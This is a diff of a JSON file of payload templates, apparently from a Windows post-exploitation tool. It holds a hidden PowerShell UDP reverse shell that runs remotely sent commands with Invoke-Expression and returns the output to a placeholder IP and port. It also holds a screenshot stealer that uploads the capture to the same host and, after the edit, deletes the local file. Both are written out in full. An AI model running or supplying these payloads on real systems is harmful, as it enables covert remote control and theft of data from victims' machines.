@@ -2,11 +2,11 @@
   "payloads": [
     {
       "payload_name": "Pop a cmd.exe shell as a demo",
-      "payload_template": "powershell.exe cmd.exe /k {{COMMAND}}"
+      "payload_template": "cmd.exe /k {{COMMAND}}"
     },
     {
       "payload_name": "UDP reverse shell",
-      "payload_template": "powershell.exe -NoP -NonI -W Hidden -c \"$ip = '{{IP}}';$port = {{PORT}};$s = 'shell>';$udpClient = new-object net.sockets.udpclient(0); \n$ready = [text.encoding]::ascii.getbytes($s); $udpClient.send($ready, $ready.length, $ip, $port); \n$ipep = new-object net.ipendpoint([net.ipaddress]::any, 0); \nwhile (1) \n{ $command = [text.encoding]::UTF8.getstring($udpClient.receive([ref]$ipep)); $commandOutput = $(Invoke-Expression $command); $responseLength = [text.encoding]::UTF8.getbytes($commandOutput).length; if ($responseLength -notlike 0) { $udpClient.send([text.encoding]::UTF8.getbytes($commandOutput), $responseLength, $ip, $port); }} \n$udpClient.close();\""
+      "payload_template": "powershell.exe -NoP -NonI -W Hidden -c \"$ip = ''{{IP}}'';$port = {{PORT}};$s = ''shell>'';$udpClient = new-object net.sockets.udpclient(0); \n$ready = [text.encoding]::ascii.getbytes($s); $udpClient.send($ready, $ready.length, $ip, $port); \n$ipep = new-object net.ipendpoint([net.ipaddress]::any, 0); \nwhile (1) \n{ $command = [text.encoding]::UTF8.getstring($udpClient.receive([ref]$ipep)); $commandOutput = $(Invoke-Expression $command); $responseLength = [text.encoding]::UTF8.getbytes($commandOutput).length; if ($responseLength -notlike 0) { $udpClient.send([text.encoding]::UTF8.getbytes($commandOutput), $responseLength, $ip, $port); }} \n$udpClient.close();\""
     },
     {
       "payload_name": "Download and execute binary",
@@ -22,7 +22,7 @@
     },
     {
       "payload_name": "Fetch current screenshot",
-      "payload_template": "powershell.exe -NoP -NonI -W Hidden -c \"$a=''system.windows.forms'';$b=''{PRTSC}'';$c=''c:\\windows\\temp\\{{FILENAME}}'';$d=''image/png'';\n[void][reflection.assembly]::loadwithpartialname($a)\n[system.windows.forms.sendkeys]::sendwait($b)\n$screenshot = $c; Get-Clipboard -Format Image | ForEach-Object -MemberName Save -ArgumentList $screenshot; Invoke-WebRequest -uri http://{{IP}}:{{PORT}} -Method Put -Infile $screenshot -ContentType $d\n\""
+      "payload_template": "powershell.exe -NoP -NonI -W Hidden -c \"$a=''system.windows.forms'';$b=''{PRTSC}'';$c=''c:\\windows\\temp\\{{FILENAME}}'';$d=''image/png'';\n[void][reflection.assembly]::loadwithpartialname($a)\n[system.windows.forms.sendkeys]::sendwait($b)\n$screenshot = $c; Get-Clipboard -Format Image | ForEach-Object -MemberName Save -ArgumentList $screenshot; Invoke-WebRequest -uri http://{{IP}}:{{PORT}} -Method Put -Infile $screenshot -ContentType $d\n\"; Remove-Item -Path $screenshot"
     },
     {
       "payload_name": "Fetch current clipboard",
